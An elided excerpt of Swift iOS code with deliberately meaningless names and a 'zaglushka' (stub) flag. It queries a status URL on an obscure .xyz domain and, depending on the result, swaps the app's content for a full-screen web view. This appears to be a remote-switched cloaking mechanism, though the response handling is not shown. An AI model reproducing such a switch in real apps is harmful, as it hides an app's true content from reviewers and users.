...
import WebKit
struct Refamradapt: ViewModifier {
    ...
    func body(content: Content) -> some View {
        ZStack {
            if !skgie {
                if sdhifoqwr != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: sdhifoqwr!, zaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
    ...
    func checkpesk() {
        guard let url = URL(string: "https://freepolicyourgheim.xyz/en/ourstatus") else {
            DispatchQueue.main.async {
                self.skgie = false
            }
            print("Invalid URL")
...
struct WKWebViewRepresentable: UIViewRepresentable {
    ...
    init(url: URL, webView: WKWebView = WKWebView(),zaglushka: Bool, onLoadCompletion: (() -> Void)? = nil) {
        self.url = url
